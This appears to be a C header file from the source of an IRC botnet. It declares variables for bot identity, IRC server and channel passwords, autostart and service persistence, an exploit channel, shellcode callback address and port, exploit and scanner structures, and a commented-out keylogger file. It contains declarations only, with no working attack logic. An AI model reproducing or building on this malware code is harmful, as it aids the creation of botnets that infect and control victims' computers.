extern HANDLE ih;              // internet handle
extern char botid[];
extern char prefix;
extern char version[];
extern char bversion[];
extern char password[];
extern char serverpass[]; // Server password
extern char channel[]; // Bot channel
extern char chanpass[]; // Password for bot channel
extern char filename[]; // Installed file name
//extern char keylogfile[]; // Key logging file for storing logged text
//autostart
extern char valuename[];
extern char exploitchan[];
//backup
extern const char *servicename;
extern const bool useservice;
extern char *authost[];
extern int  authsize;
extern char *servers[];
extern int  serversize;
/*extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];*/

extern BOOL AutoStart;
extern BOOL topiccmd;
extern SOCKET csock[64];       
extern THREAD threads[MAXTHREADS]; 
extern char szZipname[];
extern HANDLE			g_hMutex;
extern int				g_nCurrentServer;
extern bool				g_bScanning;
extern DWORD			g_dwCurrentIp;
extern DWORD			dwShellcodeIpAddress;	
extern char				szShellcodeIpAddress[16];
extern unsigned short	usShellcodePort;
extern struct			Exploit_s pExploit[];
extern bool				bScanning;
extern struct			ScannerHandler_s pScannerHandler;
extern char  szFtpdIp[16];
#define bufsize 2000
extern char msgbuf[1024];
extern char tmpbuf[1024];
extern int nTimeMs;
extern char szBlowfishKey[];
extern char tstr[256];
extern ds dl;